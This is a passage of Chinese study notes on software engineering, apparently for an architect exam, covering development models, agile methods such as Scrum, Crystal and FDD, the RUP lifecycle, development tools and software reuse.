包括算法与数据结构、数据分布、数据组织、模块间接口信息和用户界面设计，并写出<code>详细设计报告</code>。</li><li>编码与测试<br />  测试可分为单元测试、集成测试、确认测试和系统测试。</li></ul><h4 id="3-软件运行和维护"><a class="markdownIt-Anchor" href="#3-软件运行和维护"></a> 3. 软件运行和维护</h4><p>  软件维护是指对软件产品进行修改或对软件需求变化做出响应。</p><h3 id="412-软件开发模型"><a class="markdownIt-Anchor" href="#412-软件开发模型"></a> 4.1.2 软件开发模型</h3><p>  软件开发模型是从某一个特定角度提出的软件过程的简化描述。<br />  软件过程是制作软件产品的一组活动以及结果，主要包括：</p><ul><li>软件描述<br />  定义软件功能以及试用的限制。</li><li>软件开发<br />  软件的设计与实现</li><li>软件有效性检验</li><li>软件进化<br />  软件随着客户需求的变化不断改进</li></ul><h4 id="1-瀑布模型"><a class="markdownIt-Anchor" href="#1-瀑布模型"></a> 1. 瀑布模型</h4><p>  顾名思义，瀑布模型就如同瀑布一样，从一个特定的阶段流向下一个阶段，如下图所示。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/rjKS91.png" alt="瀑布模型" /></p><p>  瀑布模型的特点是因果关系紧密相连，前一个阶段工作的结果是后一个阶段工作的输入。</p><p>  瀑布模型的主要缺点如下：</p><ol><li>软件需求分析的准确性很难确定</li><li>用户和软件项目负责人需要相当长的时间才能得到初始版本，这时如果改变需求将会带来巨大损失。</li></ol><h4 id="2-原型模型"><a class="markdownIt-Anchor" href="#2-原型模型"></a> 2. 原型模型</h4><p>  原型模型又称快速模型，如下图所示，主要有<code>原型开发</code>和<code>目标软件开发</code>两个阶段。</p><p><img src="https://pic.lufer.cc/images/2021/03/22/image.png" alt="原型模型" /></p><p>  在原型开发阶段，开发人员根据用户提出的软件定义快速开发一个原型，该原型应包含目标系统的关键问题和反应目标系统的大致面貌，展示目标系统全部或部分的功能、性能等。</p><p>  开发原型可以考虑以下三个途径：</p><ul><li>利用模拟软件系统的人机界面和人机交互方式</li><li>真正开发一个原型</li><li>用其他类似软件进行比较</li></ul><p>  在征求用户对原型的意见后对原型进行修改完善，确认软件系统的需求并达到一致的理解，进一步开发实际系统。</p><p>  使用原型模型需要注意：</p><ol><li>用户对系统模糊不清，无法准确回答目标系统的需求</li><li>要有一定的开发环境和工具支持</li><li>经过对原型的若干次修改，应收敛到目标范围内，否则可能会失败。</li><li>对大型软件来说，原型可能非常复杂难以快速性能。</li></ol><p>  在实际工作中，由于各种原因，大多数原型都废弃不用，仅仅把建立原型的过程作为帮助定义软件需求的一种手段。</p><h4 id="3-螺旋模型"><a class="markdownIt-Anchor" href="#3-螺旋模型"></a> 3. 螺旋模型</h4><p>  螺旋模型把软件开发流程分为了多个阶段，每个阶段都包括目标设定、风险分析、开发和有效性验证、评审 4 个阶段，由这 4 个阶段进行迭代，软件开发过程每迭代一次，软件开发就前进一个层次。采用螺旋模型的软件过程如下图所示。</p><p><img src="https://pic.lufer.cc/images/2021/03/22/imagea47f8281caf5a208.png" alt="螺旋模型" /></p><h4 id="4-基于可重用构建的模型"><a class="markdownIt-Anchor" href="#4-基于可重用构建的模型"></a> 4. 基于可重用构建的模型</h4><p>  随着软构件技术的发展，人们开始尝试利用软构件进行搭积木式的开发，即构件组装模型。在构建组装模型中，当经过需求分析定义出软件功能后，将对构件的组装结构进行设计，将系统划分成一组构件的集合，明确构件之间的关系。在确定了系统构件后，则将独立完成每一个构件，这时既可以开发软件构件，也可以重用已有的构件，当然也可以购买或选用第三方的构件。构件是独立的、自包容的，因此架构的开发也是独立的，构件之间通过接口相互协作。构件组装模型的一般开发过程如下图所示。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/rj0pon.png" alt="构件组装模型" /></p><p>  构件组装模型的优点如下：</p><ol><li>构件的自包容性让系统的扩展变得更加容易</li><li>设计良好的构件更容易被重用，降低软件开发成本</li><li>构件的粒度较整个系统更小，因此安排开发任务更加灵活，可以将开发团队分成若干组，并行地独立开发构件。</li></ol><p>  然而鱼与熊掌不可兼得，构件组装模型也有明显的缺点：</p><ol><li>对构件的设计需要经验丰富的架构设计师，设计不良的构件难以实现构件的优点，降低构件组装模型的重用度。</li><li>在考虑软件的重用度时，往往会对其他方面做出让步，如性能等。</li><li>使用构件组装应用程序时，要求程序员熟练地掌握构件，增加了研发人员的学习成本。</li><li>第三方构件库的质量会最终影响到软件的质量，而第三方构件库的质量往往是开发团队难以控制的。</li></ol><h3 id="413-敏捷方法"><a class="markdownIt-Anchor" href="#413-敏捷方法"></a> 4.1.3 敏捷方法</h3><h4 id="1-敏捷方法的特点与核心思想"><a class="markdownIt-Anchor" href="#1-敏捷方法的特点与核心思想"></a> 1. 敏捷方法的特点与核心思想</h4><ol><li>适应性而非预设性<br />  敏捷方法拥抱变化，利用变化来发展，甚至改变自己，最后完善自己。</li><li>面向人而非面向过程<br />  充分发挥人的特性，软件开发在无过程控制和过于严格繁琐的过程控制之间取得平衡。</li><li>迭代增量式的开发过程<br />  以原型开发思想为基础，采用迭代增量式开发，发行版本小型化。每一个发行版都是在前一成功发行版的基础上进行功能需求扩充，最后满足用户所有功能需求。</li></ol><h4 id="2-敏捷方法的主要内容"><a class="markdownIt-Anchor" href="#2-敏捷方法的主要内容"></a> 2. 敏捷方法的主要内容</h4><p>  敏捷方法主要包括4个核心价值观和12条过程实践规则。</p><p>  4个核心价值观分别是：</p><ol><li>沟通<br />  设计者、开发者和客户三者之间的有效交流是开发成功的关键。</li><li>简单<br />  只满足当前功能需求，不做假想设计，尽量使代码简单化。</li><li>反馈<br />  设计者、开发者和客户之间及时和详尽的意见反馈是开发成功的保证。</li><li>勇气<br />  在必须做出取舍或重构时，勇于抉择，勇于实践。</li></ol><p>  12 条过程实践规则分别是：<code>简单设计</code>、<code>测试驱动</code>、<code>代码重构</code>、<code>结对编程</code>、<code>持续集成</code>、<code>现场客户</code>、<code>发行版本小型化</code>、<code>系统隐喻</code>、<code>代码集体所有制</code>、<code>规则策略</code>、<code>规范代码</code>、<code>40小时工作制</code>。</p><h4 id="3-xp"><a class="markdownIt-Anchor" href="#3-xp"></a> 3. XP</h4><p>  XP 是一种轻量（敏捷）、高效、低风险、柔性、可预测、科学而且充满乐趣的软件开发方式。与其他方法论相比，其最大的不同在于：</p><ul><li>在更短的周期内，更早地提供具体、持续的反馈信息。</li><li>迭代地进行计划编制，首先在最开始迅速生成一个总体计划，然后在整个项目开发过程中不断地发展它。</li><li>依赖于自动测试程序来监控开发进度，并及早地捕获缺陷。</li><li>依赖于口头交流、测试和源程序进行沟通。</li><li>倡导持续的、演化式的设计。</li><li>依赖于开发团队内部的紧密协作。</li><li>尽可能达到程序员短期利益和项目长期利益的平衡。</li></ul><p>  XP由<code>价值观</code>、<code>原则</code>、<code>实践</code>和<code>行为</code>四个部分组成，它们彼此相互依赖、关联，并通过行为贯穿于整个生命周期。</p><h4 id="4-水晶系列方法"><a class="markdownIt-Anchor" href="#4-水晶系列方法"></a> 4. 水晶系列方法</h4><p>  水晶方法（Crystal），是由 Alistair Cockburn 和 Jim Highsmith 建立的敏捷方法系列，其目的是发展一种提倡“机动性的”方法，包含具有共性的核心元素，每个都含有独特的角色、过程模式、工作产品和实践。<br />  Crystal 家族实际上是一组经过证明、对不同类型项目非常有效的敏捷过程，它的发明使得敏捷团队可以根据其项目和环境选择最合适的 Crystal 家族成员（分为 Crystal Clear，Crystal Yellow，Crystal Orange 和 Crystal Red 分别适用于不同的项目）。水晶方法中，使用频度较高的是 Crystal Clear——透明水晶方法。透明水晶方法，适合于一个小团队来进行敏捷开发，人数在 6 人以下为宜。</p><p>  透明水晶方法有七大体系特征：</p><ol><li>经常交付<br />  任何项目，无论大小、敏捷程度，其最重要的一项体系特征是每过几个月就向用户交付已测试的运行代码。如果你使用了此体系特征，你就会发现，“经常交付”的作用还是很让人吃惊的。<br />  项目主办者根据团队的工作进展获得重要反馈。用户有机会发现他们原来的需求是否是他们真正想要的，也有机会将观察结果反馈到开发当中。开发人员打破未决问题的死结，从而实现对重点的持续关注。团队得以调整开发和配置的过程，并通过完成这些工作鼓舞团队的士气。</li><li>反思改进<br />  在我们的开发中，时常会出现这样那样的问题，技术难题、各种烦心事等，这会在很大的程度上影响项目的进展。而且，如果其他任务对这项任务有依赖的话，那么其他的任务也会被推迟，这就很可能会导致项目的失败。<br />  换句话说，如果我们能够经常在迭代会中及时地反思和改进，那么，这种事情应该是不会发生的，或者说发生了，也能够很快地找到解决方案去应对它。事实上，从慌乱的日常开发中，抽出一点时间来思考更为行之有效的工作方法就已经足够了。</li><li>渗透式交流<br />  渗透交流就是信息流向团队成员的背景听觉，使得成员就像通过渗透一样获取相关信息。这种交流通常都是通过团队成员在同一间工作室内工作而实现的。若其中一名成员提出问题，工作室内的其他成员可以选择关注或不关注的态度，可以加入到这个问题的讨论当中来，也可以继续忙自己的工作。</li><li>个人安全<br />  个人安全指的是当你指出困扰你的问题时，你不用担心受到报复。个人安全非常重要，有了它，团队可以发现和改正自身的缺点。没有它，团队成员们知而不言，缺点则愈发严重以至于损害整个团队。个人安全是迈向信任的第一步。有了信任，团队协作才能真正地实施，开发效率也就会直线上升的。</li><li>焦点<br />  所谓“焦点”，就是确定首先要做什么，然后安排时间，以平和的心态开展工作。确保团队成员清楚地了解他们自己最重要的任务是什么，确保他们能够有充分的时间去完成这些任务。</li><li>与专家用户建立方便的联系<br />  与专家用户持续建立方便的联系能够给团队提供：对经常交付进行配置以及测试的地方，关于成品质量的快速反馈，关于设计理念的快速反馈，最新的（用户）需求。</li><li>配有自动测试、配置管理和经常集成功能的技术环境<br />  自动测试可以为开发人员在代码修改后就可以进行自动测试，并且能够发现存在的一些bug，以至开发人员能够及时地进行修改，对于他们来说，节省了时间，提高了效率，而且还不用为烦人的测试而苦恼。<br />  配置管理系统允许人们不同步地对工作进行检查，可撤销更改，并且可以将某一系统设置保存后进行新系统的发布，当新系统出现问题，即可还原原系统的设置。<br />  经常集成可以使得团队在一天之内对系统进行多次集成。其实，团队越频繁地对系统进行集成，他们就能够越快地发现错误，堆积到一起的错误也会越少，并使他们产生更新的灵感。<br />  最好的团队是将这三大技术结合成“持续测试集成技术”。这样做他们可以在几分钟内发现因集成所产生的错误。</li></ol><h4 id="5-开放式源码"><a class="markdownIt-Anchor" href="#5-开放式源码"></a> 5. 开放式源码</h4><p>  开放式源码指的是开放源码界所用的一种运作方式。开放式源码项目有一个特别之处，就是程序开发人员在地域上分布很广，这使得它和其他敏捷方法不同，因为一般的敏捷方法都强调项目组成员在同一地点工作。开放源码的一个突出特点就是查错排障（debug）的高度并行性，任何人发现了错误都可将改正源码的“补丁”文件发给维护者。然后由维护者将这些“补丁”或是新增的代码并入源码库。</p><h4 id="6-scrum"><a class="markdownIt-Anchor" href="#6-scrum"></a> 6. SCRUM</h4><p>  Scrum 是一个用于开发和维持复杂产品的框架，是一个增量的、迭代的开发过程。在这个框架中，整个开发过程由若干个短的迭代周期组成，一个短的迭代周期称为一个 Sprint，每个 Sprint 的建议长度是 2 到 4 周(互联网产品研发可以使用 1 周的 Sprint)。在 Scrum 中，使用产品 Backlog 来管理产品的需求，产品 Backlog 是一个按照商业价值排序的需求列表，列表条目的体现形式通常为<code>用户故事</code>。Scrum 团队总是先开发对客户具有较高价值的需求。<br />  在 Sprint 中，Scrum 团队从产品 Backlog 中挑选最高优先级的需求进行开发。挑选的需求在 Sprint 计划会议上经过讨论、分析和估算得到相应的任务列表，我们称它为 Sprint backlog。在每个迭代结束时，Scrum 团队将递交潜在可交付的产品增量。<br />  Scrum 起源于软件开发项目，但它适用于任何复杂的或是创新性的项目。Scrum 的基本流程如下图所示。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/swwUmt.png" alt="Scrum流程图" />]</p><h5 id="1scrum-的五个活动"><a class="markdownIt-Anchor" href="#1scrum-的五个活动"></a> 1．Scrum 的五个活动</h5><p>  Scrum 主要包括：产品待办事项列表梳理、Sprint 计划会议、每日 Scrum 会议、Sprint评审会议、Sprint 回顾会议等五个活动。</p><ol><li>产品待办事项列表梳理<br />  产品待办事项通常会很大，也很宽泛，而且想法会变来变去、优先级也会变化，所以产品待办事项列表梳理是一个始终贯穿整个 Scrum 项目的活动。该活动包含但不限于以下的内容：保持产品待办事项列表有序、把看起来不再重要的事项移除或者降级、增加或提升涌现出来的或变得更重要的事项、将事项分解成更小的事项、将事项归并为更大的事项、对事项进行估算。<br />  产品待办事项列表梳理的一个最大好处是为即将到来的几个 Sprint 做准备。为此，梳理时会<code>特别关注那些即将被实现的事项</code>。需要考虑不少因素，这包括但不限于以下的内容：<br />  理想情况下，下一个 Sprint 的备选事项都应该提升“商业价值”。开发团队需要能够在一个 Sprint 内完成每一个事项。每个人都需要清楚预期产出是什么。<br />  产品开发决定了，有可能需要其他的技能和输入。因此，产品待办事项列表梳理最好是所有团队成员都参与的活动，而不单单是产品负责人。</li><li>Sprint 计划会议<br />  每个 Sprint 都以 Sprint 计划会议作为开始，这是一个<code>固定时长</code>的会议，在这个会议中，Scrum 团队共同选择和理解在即将到来的 Sprint 中要完成的工作。<br />  整个团队都要参加 Sprint 计划会议。针对排好序的产品待办事项列表（Product Backlog），产品负责人和开发团队成员讨论每个事项，并对该事项达成共识，包括根据当前的“完成的定义”，为了完成该事项所需要完成的所有事情。所有的 Scrum 会议都是限定时长的。Sprint 计划会议推荐时长是 Sprint 中的<code>每周对应两小时</code>或者更少（例如，一个 Sprint 包含 2 个星期，则 Sprint 计划会议时长应为 4 个小时或者更少）。因为会议是限制时长的,Sprint 计划会议的成功十分依赖于产品待办事项列表的质量。这就是产品待办事项列表梳理十分重要的原因。<br />  在 Scrum 中，Sprint 计划会议有两部分：<br />  <code>第一部分：需要完成哪些工作？</code><br />  在会议的第一部分，产品负责人向开发团队介绍<code>排好序的产品待办事项</code>，整个 Scrum 团队共同理解这些工作。<br />  Sprint 中需要完成的产品待办事项数目完全由开发团队决定。为了决定做多少，开发团队需要考虑当前产品增量的状态，团队过去的工作情况，团队当前的生产能力，以及排好序的产品待办事项列表。做多少工作只能由开发团队决定。产品负责人或任何其他人，都不能给开发团队强加更多的工作量。<br />  通常 Sprint 都有个目标，称作 Sprint 目标。这将十分有效地帮助大家更加专注于需要完成的工作的本质，而不必花太多精力去关注那些对于我们需要完成的工作并不重要的小细节。<br />  <code>第二部分：如何完成工作？</code><br />  在会议的第二部分里，开发团队需要根据当前的“完成的定义”一起决定如何实现下一个产品增量。他们进行足够的设计和计划，从而有信心可以在 Sprint 中完成所有工作。前几天的工作会被分解成小的单元，每个工作单元不超过一天。之后要完成的工作可以稍大些，以后再对它们进行分解。<br />  决定如何完成工作是开发团队的职责，决定做什么则是产品负责人的职责。在计划会议的第二部分，产品负责人可以继续留下来回答问题，以及澄清一些误解。<br />  不管怎样，团队应该很容易找到产品负责人。<br />  Sprint 计划会议最终需要 Scrum 团队对 Sprint 需要完成工作的数量和复杂度达成共识，并预期在一个合理的条件范围内完成它们。开发团队预测并共同承诺他们要完成的工作量。总而言之：在 Sprint 计划会议中，开发团队和产品负责人一起考虑并讨论产品待办事项，确保他们对这些事项的理解，选择一些他们预测能完成的事项，创建足够详细的计划来确保他们能够完成这些事项。<br />  最终产生的待办事项列表就是“Sprint 待办事项列表（Sprint Backlog）”。</li><li>每日 Scrum 会议<br />  开发团队是自组织的。开发团队通过每日 Scrum 会议来确认他们仍然可以实现 Sprint 的目标。这个会议<code>每天在同样的时间和同样的地点</code>召开。每一个开发团队成员需要提供以下三点信息：<br />  从上一个每日 Scrum 到现在，我完成了什么；从现在到下一个每日 Scrum，我计划完成什么；有什么阻碍了我的进展。<br />  每日 Scrum 中可能有简要的问题澄清和回答，但是不应该有任何话题的讨论。通常，许多团队会在每日 Scrum 之后马上开会处理他们遇到的任何问题。<br />  每日 Scrum 既不是向管理层汇报，也不是向产品负责人或者 ScrumMaster 汇报。它是一个开发团队<code>内部的沟通会议</code>，来保证他们对现状有一致的了解。只有 Scrum 团队的成员，包括 ScrumMaster 和产品负责人，可以在会议中发言。其他感兴趣的人可以来旁听。在必要时，开发团队会基于会议中的发现重新组织他们的工作来完成 Sprint 的目标。<br />  每日 Scrum 是 Scrum 的一个关键组成部分，它可以带来透明性,信任和更好的绩效。它能帮助快速发现问题，并促进团队的自组织和自立。所有 Scrum 会议都是限定时长的。每日 Scrum 通常<code>不超过 15 分钟</code>。</li><li>Sprint 评审会议<br />  Sprint 结束时，Scrum 团队和相关人员一起评审 Sprint 的产出。Sprint 评审会议的推荐时长是 Sprint 中的每一周对应一个小时（例如，一个 Sprint 包含 2 个星期，则 Sprint 评审会议时长为 2 个小时）。<br />  讨论围绕着 Sprint 中完成的产品增量。由于 Sprint 的产出会涉及一些人的“利益”，因此一个明智的做法是邀请他们参加这个会议，这会很有帮助。这个会议是个非正式的会议,帮助大家了解我们目前进展到哪里，并一起讨论我们下一步如何推进。每个人都可以在Sprint 评审会议上发表意见。当然，产品负责人会对未来做出最终的决定，并适当地调整产品待办事项列表 Product Backlog。<br />  团队会找到他们自己的方式来开 Sprint 评审会议。通常会演示产品增量,整个小组也会经常讨论他们在 Sprint 中观察到了什么、有哪些新的产品想法出现。他们还会讨论产品待办事项列表的状态、可能的完成日期以及在这些日期前能完成什么。Sprint 评审会议向每个人展示了当前产品增量的概况。因此，通常都会在 Sprint 评审会议中调整产品待办事项列表。</li><li>Sprint 回顾会议<br />  在每个 Sprint 结束后,Scrum 团队会聚在一起开 Sprint 回顾会议,目的是回顾一下团队在流程人际关系以及工具方面做得如何。团队识别出哪些做得好,哪些做得不好,并找出潜在的改进事项,为将来的改进制定计划。Sprint 回顾会议的推荐时长是 Sprint 中的每一周对应一个小时（例如，一个 Sprint 包含 2 个星期，则 Sprint 回顾会议时长为 2 个小时）。<br />  Scrum 团队总是在 Scrum 的框架内，改进他们自己的流程。</li></ol><h5 id="2scrum-的-5-大价值观"><a class="markdownIt-Anchor" href="#2scrum-的-5-大价值观"></a> 2．Scrum 的 5 大价值观</h5><p>  Scrum 的 5 大价值观为：</p><ul><li>承诺—愿意对目标做出承诺。</li><li>专注—把你的心思和能力都用到你承诺的工作上去。</li><li>开放—Scrum 把项目中的一切开放给每个人看。</li><li>尊重—每个人都有他独特的背景和经验。</li><li>勇气—有勇气做出承诺，履行承诺，接受别人的尊重。</li></ul><h4 id="7-fdd"><a class="markdownIt-Anchor" href="#7-fdd"></a> 7. FDD</h4><p>  FDD 是一个迭代的开发模型。FDD 的每一步都强调质量，不断地交付可运行的软件，并以很小的开发提供精确的项目进度报告和状态信息。同敏捷方法一样，FDD 弱化了过程在软件开发中的地位。虽然 FDD 中也定义了开发的过程，不过一个几页纸就能完全描述的过程深受开发者的喜爱。</p><h5 id="1fdd角色定义"><a class="markdownIt-Anchor" href="#1fdd角色定义"></a> 1．FDD角色定义</h5><p>  FDD 认为，有效的软件开发不可缺少的三个要素是：<code>人</code>、<code>过程</code>和<code>技术</code>。软件开发不能没有过程，也不能没有技术，但软件开发中最重要的是人。个人的生产率和人的技能将会决定项目的成败。为了让项目团队能够紧密地工作在一起，FDD 定义了 6 种关键的项目角色：</p><ol><li>项目经理<br />  项目经理是开发的组织者，但项目经理不是开发的主宰。对于项目团队来说，项目经理应该是团队的保护屏障。他将同团队外界（如高层领导、人事甚至写字楼的物业管理员）进行沟通，努力为团队提供一个适宜的开发环境。</li><li>首席架构设计师<br />  负责系统架构的设计。</li><li>开发经理<br />  开发经理负责团队日常的开发，解决开发中出现的技术问题与资源冲突。</li><li>主程序员<br />  主程序员将带领一个小组完成特征的详细设计和构建的工作，一般要求主程序员具有一定的工作经验，并能够带动小组的工作。</li><li>程序员<br />  若干个程序员在主程序员的带领下形成一个开发小组，按照特征开发计划完成开发。</li><li>领域专家<br />  领域专家是对业务领域精通的人，一般由客户、系统分析员等担当。领域专家作为关键的项目角色正是敏捷宣言中“业务人员同开发人员紧密合作”的体现。</li></ol><p>  根据项目规模的大小，有些角色是可以重复的。例如在一个小规模项目中，项目经理自身的能力很强，他就可以同时担当项目经理、首席架构设计师和开发经理的角色。</p><h5 id="2核心过程"><a class="markdownIt-Anchor" href="#2核心过程"></a> 2．核心过程</h5><p>  FDD 共有 5 个核心过程，如下图所示。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/saOaGD.png" alt="FDD核心过程" /></p><ol><li>开发整体对象模型<br />  开发整体对象模型也就是<code>业务建模</code>的阶段。不过 FDD 强调的是系统地完整地面向对象建模，这种做法有助于把握整个系统，而不仅仅关注系统中的若干个点。在这一阶段，<code>领域专家和首席架构设计师</code>相互配合，完成整体对象模型。</li><li>构造特征列表<br />  完成系统建模后，需要构造一个完整的特征列表。所谓特征指的是一个小的、对客户有价值的功能。采用动作、结果和目标来描述特征，特征的粒度最好可以在两周之内实现。在这一阶段中，可以整理出系统的需求。</li><li>计划特征开发<br />  任何一个软件项目都必须有计划——无论是重载方法还是敏捷方法。在这一阶段中，<code>项目经理</code>根据构造出的特征列表、特征间的依赖关系进行计划，安排开发任务。</li><li>特征设计<br />  在这一阶段，<code>主程序员</code>将带领特征小组对特征进行详细设计，为后面的构建做准备。</li><li>特征构建<br />  特征构建和特征设计这两个阶段合并起来可以看做特征的实现阶段，这两个阶段反复地迭代，直到完成全部的开发。</li></ol><h5 id="3最佳实践"><a class="markdownIt-Anchor" href="#3最佳实践"></a> 3．最佳实践</h5><p>  组成 FDD 的最佳实践包括：领域对象建模、根据特征进行开发、类的个体所有、组成特征小组、审查、定期构造、配置管理、结果的可见性。<br />  其中最有特色的莫过于<code>类的个体所有</code>。几乎所有的开发模型都是代码共有，程序员们负责开发系统中的全部代码，并通过配置管理和变更控制来保持代码的一致性。在 FDD 中，<code>将类分配给特定的任何小组</code>，分配给 A 成员的代码将全部由 A 来维护，除 A 外的角色都不能修改它，只能使用它。这样做当然有它的优点：个人对所分配的类很容易保持概念的完整性；开发类代码的人肯定是最熟悉这个类的主人；而对这个类的支配感会促使开发人员产生自豪感，从而更出色地完成任务。不过 FDD 也提到了类个体所有的缺陷：项目中的依赖关系增强、当 A 需要 B 修改他自己的类时，必须等待 B 完成修改才能使用；类的个体所有增加了员工离职的损失。面对这些优点和缺陷，显然 FDD 认为类的个体所有对系统开发更有帮助。<br />  除类的个体所有外，<code>审查</code>也是 FDD 中很具特色的一项实践。不少人都认为审查是非常严格的软件过程所特有的，因为进行审查不但要花费不少的人力和时间，对审查者本身的素质也有要求。然而在 FDD 中，明确地将审查作为一项最佳实践提出。审查是一种很有效的发现缺陷的手段，但经常被忽视，国内的软件组织中很少有严格审查制度保证软件质量。有效的审查可以发现很多潜在的问题，而这些问题往往是无法通过测试发现的，例如建模、需求和设计期的缺陷。这些潜在的缺陷大多要到系统测试甚至发布后才能发现，修正这些缺陷的代价是很大的。</p><h4 id="8-asd"><a class="markdownIt-Anchor" href="#8-asd"></a> 8. ASD</h4><p>  ASD (Adaptive Software Development)方法由 Jim Highsmith 提出，其核心是三个非线性的、重叠的开发阶段：猜测、合作与学习。</p><h3 id="414-rup"><a class="markdownIt-Anchor" href="#414-rup"></a> 4.1.4 RUP</h3><h4 id="1-rup概述"><a class="markdownIt-Anchor" href="#1-rup概述"></a> 1. RUP概述</h4><p>  统一过程（Unified Process，UP）是由 Rational 公司开发的一种迭代的软件过程，是一个优秀的软件开发模型，它提供了完整的开发过程解决方案，可以有效地降低软件开发过程的风险，经过裁剪的 UP 可以适应各种规模的团队和系统。</p><h4 id="2-rup的生命周期"><a class="markdownIt-Anchor" href="#2-rup的生命周期"></a> 2. RUP的生命周期</h4><p>  UP 是一个很有特色的模型，它本身是一个二维的结构，如下图所示。</p><p><img src="https://pic.lufer.cc/images/2021/03/15/rjBUuF.md.png" alt="UP模型" /></p><p>  RUP中有9个核心工作流，位于图的左侧。</p><ol><li>业务建模<br />  理解待开发系统所在的机构及其商业运作，确保所有参与人员对待开发系统所在的机构有共同的认识，评估待开发系统对所在机构的影响。</li><li>需求<br />  定义系统功能及用户界面，使客户知道系统的功能，使开发人员理解系统的需求，为项目预算及计划提供基础。</li><li>分析与设计<br />  把需求分析的结果转化为分析与设计模型。</li><li>实现<br />  把设计模型转换为实现结果，对开发的代码做单元测试，将不同实现人员开发的模块集成为可执行系统。</li><li>测试<br />  检查各个子系统的交互与集成，验证所有需求是否均被正确实现，对发现的软件质量上的缺陷进行归档，对软件质量提出改进建议。</li><li>部署<br />  打包、分发、安装软件，升级旧系统。培训用户及销售人员，提供技术支持。</li><li>配置与变更管理<br />  跟踪并维护系统开发过程中产生的所有制品的一致性和完整性。</li><li>项目管理<br />  为软件开发项目提供计划，软件分配，执行，监控等方面的指导，为风险管理提供框架。</li><li>环境<br />  为软件开发机构提供软件开发环境，即提供过程管理和工具的支持。</li></ol><p>  RUP把生命周期划分为多个循环，每个循环都由4个连续的阶段组成，如图上侧所示。</p><ol><li>初始阶段<br />  定义最终产品试图和业务模型，并确定系统范围。</li><li>细化阶段<br />  设计并确定系统的架构，制定工作计划及资源要求。</li><li>构造阶段<br />  构造产品并继续演进需求、架构、计划直至产品提交。</li><li>移交阶段<br />  把产品提交给用户使用。</li></ol><h4 id="3-rup的特点"><a class="markdownIt-Anchor" href="#3-rup的特点"></a> 3. RUP的特点</h4><ol><li>用例驱动<br />  需求分析、设计、实现和测试等活动都是用例驱动。</li><li>以架构为中心<br />  软件架构是关于构成系统的元素、这些元素之间的交互、元素和元素之间的组成模式以及作用在这些组成模式上的约束等方面的描述。<br />  对于一个软件系统，不同人员关心的内容是不一样的，因此软件的架构是一个多维的结构，通常会采用多个视图来描述软件架构。在RUP中，通常采用如下图所示的“4+1”视图模型。<br /><img src="https://pic.lufer.cc/images/2021/03/25/image.png" alt="image.png" /><br />  分析和测试人员关心的是系统的行为，因此会侧重于用例视图。最终和用户关心的是系统的功能，所以会侧重于逻辑视图。程序员关心的是系统的配置、装配等问题，因此会侧重于实现视图。系统集成人员关心的是系统的性能、可伸缩性、吞吐率等问题，因此会侧重于进程视图。系统工程师关心的是系统的发布、安装、拓扑结构等问题，因此会侧重于部署视图。</li><li>迭代与增量<br />  RUP强调要用迭代和增量的方式来开发软件。</li></ol><h4 id="4-rup裁剪"><a class="markdownIt-Anchor" href="#4-rup裁剪"></a> 4. RUP裁剪</h4><p>  RUP是一个通用的模板，通过对RUP进行裁剪可以获得很多不同的软件开发过程。</p><p>  针对一个软件项目，RUP裁剪可分为以下几步：</p><ol><li>确定本项目的软件开发过程需要那些工作流<br />  可根据项目的规模、类型对核心流做一些取舍。</li><li>确定每个工作流要产出哪些制品<br />  如规定某个工作流要产出哪些制品。</li><li>确定4个阶段之间如何演进<br />  以风险控制为原则，决定每个阶段要执行哪些工作流，每个工作流执行到什么程度，产出的制品有哪些，每个制品完成到什么程度等。</li><li>确定每个阶段内的迭代计划<br />  规划每次迭代开发的内容有哪些。</li><li>规划工作流内部结构<br />  通常用活动图的形式给出。</li></ol><h3 id="415-软件系统工具"><a class="markdownIt-Anchor" href="#415-软件系统工具"></a> 4.1.5 软件系统工具</h3><h4 id="1-软件开发工具"><a class="markdownIt-Anchor" href="#1-软件开发工具"></a> 1. 软件开发工具</h4><ol><li>需求分析工具</li><li>基于自然语言或图形描述的工具</li><li>基于形式化需求定义语言的工具</li><li>其他需求分析工具</li></ol><h4 id="2-设计工具"><a class="markdownIt-Anchor" href="#2-设计工具"></a> 2. 设计工具</h4><h4 id="3-编码与排错工具"><a class="markdownIt-Anchor" href="#3-编码与排错工具"></a> 3. 编码与排错工具</h4><h4 id="4-软件维护工具"><a class="markdownIt-Anchor" href="#4-软件维护工具"></a> 4. 软件维护工具</h4><ol><li>版本控制工具</li><li>文档分析工具</li><li>开发信息库工具</li><li>逆向工程工具</li><li>再工程工具</li></ol><h4 id="5-软件管理和软件支持工具"><a class="markdownIt-Anchor" href="#5-软件管理和软件支持工具"></a> 5. 软件管理和软件支持工具</h4><ol><li>项目管理工具</li><li>配置管理工具</li><li>软件评价工具</li><li>软件开发工具的评价和选择<ul><li>功能</li><li>易用性</li><li>稳健性</li><li>硬件要求和性能</li><li>服务和支持</li></ul></li></ol><h2 id="45-软件的重用"><a class="markdownIt-Anchor" href="#45-软件的重用"></a> 4.5 软件的重用</h2><p>  软件重用是指在两次或多次不同的软件开发过程中重复的使用相同或相似软件元素的过程。<br />  软件元素主要包括需求分析文档、设计过程、设计文档、程序代码、测试用例和领域知识等。</p><p>  软件重用可以分为横向重用和纵向重用。<br />  横向重用是指重用不同应用领域中的软件元素。例如标准函数库。<br />  纵向重用是指在一类具有较多公共性的应用领域之间进行软部件重用。</p><p>  常见的软件重用形式包括：</p><ol><li>源代码重用<br />  这是最简单也是最常见的重用形式，但由于软件系统的复杂性，很难大规模地重用已有源代码。</li><li>架构重用<br />  架构重用也很常见，随着软件架构风���和设计模式的推广和应用，架构重用已经对软件开发产生了重大的影响。</li><li>应用框架的重用<br />  随着软件技术的发展，应用框架的重用变得越来越普遍，很多成熟的软件公司都建立了自己的开发框架。在开源社区中，世界各地的技术爱好者也在不断地推出应用了各种新技术的开发框架，例如，应用了 AOP（Aspect Oriented Programming，面向方面编程）技术的 Spring 等。</li><li>业务建模的重用<br />  虽然不同的软件的业务领域各自不同，但人们还是总结出了一些常见领域的建模方法，重用这些领域模型可以降低因领域知识不足而造成的需求风险。</li><li>文档及过程的重用<br />  软件文档和软件过程也是软件开发中不可或缺的元素，有效地重用这些文档和过程也有助于提高开发效率和软件质量、降低开发成本。</li><li>软件服务的重用<br />  随着 Web 服务的提出，人们越来越关注服务的重用。SOA（Service-Oriented Architecture，面向服务的架构）提出了面向服务的软件架构，并定义了相应的标准。</li></ol><h1 id="第五章-软件架构设计"><a class="markdownIt-Anchor" href="#第五章-软件架构设计"></a> 第五章 